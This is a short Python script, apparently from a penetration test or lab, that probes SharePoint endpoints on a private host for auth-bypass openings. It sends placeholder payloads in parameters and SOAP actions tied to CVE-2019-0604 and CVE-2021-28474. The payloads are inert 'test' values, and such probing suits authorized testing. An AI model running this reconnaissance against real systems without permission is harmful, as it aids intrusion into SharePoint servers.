# Purpose: Test if accessible endpoints can be exploited for auth bypass
# Outcome: Check if MSOTlPn_DWP injection works on accessible endpoints

import requests
from urllib.parse import quote

target_base = "http://10.10.10.166"

# Accessible endpoints from previous test
accessible_endpoints = [
    "/_layouts/15/start.aspx",
    "/_layouts/15/WebPartGallery.aspx",
    "/_layouts/15/Picker.aspx",
]

# Test payload from original exploit (simplified)
test_payloads = [
    "MSOTlPn_DWP=test",
    "MSOTlPn_Uri=http%3A%2F%2Ftest",
    "__VIEWSTATE=test",
    "hiddenSpanData=test",  # Used in CVE-2019-0604
]

headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": "Mozilla/5.0",
}

print("[*] Testing MSOTlPn_DWP injection on accessible endpoints...")

for endpoint in accessible_endpoints:
    print(f"\n[*] Testing {endpoint}:")
    
    # Test GET first
    try:
        r = requests.get(f"{target_base}{endpoint}", timeout=10)
        print(f"    GET: {r.status_code}, Content-Length: {len(r.text)}")
    except Exception as e:
        print(f"    GET: Error - {e}")
    
    # Test POST with each payload
    for payload in test_payloads:
        try:
            r = requests.post(f"{target_base}{endpoint}", headers=headers, data=payload, timeout=10)
            # Check if response differs from GET or indicates processing
            print(f"    POST {payload[:20]}...: {r.status_code}, Len: {len(r.text)}")
        except Exception as e:
            print(f"    POST {payload[:20]}...: Error - {str(e)[:30]}")

# Test WebPartPages.asmx with proper SOAP
print("\n[*] Testing /_vti_bin/WebPartPages.asmx with SOAP...")
soap_headers = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": "http://microsoft.com/sharepoint/webpartpages/RenderWebPartForEdit",
}
soap_body = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<RenderWebPartForEdit xmlns="http://microsoft.com/sharepoint/webpartpages">
<webPartXml>test</webPartXml>
</RenderWebPartForEdit>
</soap:Body>
</soap:Envelope>"""

try:
    r = requests.post(f"{target_base}/_vti_bin/WebPartPages.asmx", headers=soap_headers, data=soap_body, timeout=10)
    print(f"    SOAP RenderWebPartForEdit: {r.status_code}")
    print(f"    Response preview: {r.text[:200]}")
except Exception as e:
    print(f"    SOAP: Error - {e}")

# Test ExecuteProxyUpdates (from CVE-2021-28474)
soap_headers["SOAPAction"] = "http://microsoft.com/sharepoint/webpartpages/ExecuteProxyUpdates"
try:
    r = requests.post(f"{target_base}/_vti_bin/WebPartPages.asmx", headers=soap_headers, data=soap_body, timeout=10)
    print(f"    SOAP ExecuteProxyUpdates: {r.status_code}")
except Exception as e:
    print(f"    SOAP ExecuteProxyUpdates: Error - {e}")

print("\n[*] Accessible endpoint exploitation test complete")
